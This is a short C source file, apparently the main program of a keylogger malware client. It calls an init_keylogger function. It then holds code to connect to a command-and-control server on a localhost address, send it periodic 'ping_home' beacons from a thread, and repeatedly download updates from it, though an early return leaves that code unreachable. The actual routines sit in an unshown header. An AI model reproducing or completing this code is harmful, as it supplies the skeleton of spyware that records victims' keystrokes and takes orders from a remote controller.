#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>

/* For sockets */
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

#include "core.h"

#define IP_ADDR "127.0.0.1"
#define PORT 8080

void *inf_ping(void *socket_desc)
{
	while (1) {
		ping_home(socket_desc);
		sleep(1);
	}

}

int main()
{
	int socket_desc = 0;
	struct sockaddr_in server;
	
	init_keylogger();
	return 0;

	memset(&server, 0, sizeof(server));
	
	pthread_t thread_id;

	if (connect_cc(IP_ADDR, PORT + 1, &socket_desc, &server, 0) == ERROR)
		return ERROR;

	pthread_create(&thread_id, NULL, inf_ping, &socket_desc);

	while (1)
	{
		download_update(IP_ADDR, PORT);
		sleep(5);
	}


	return 0;
}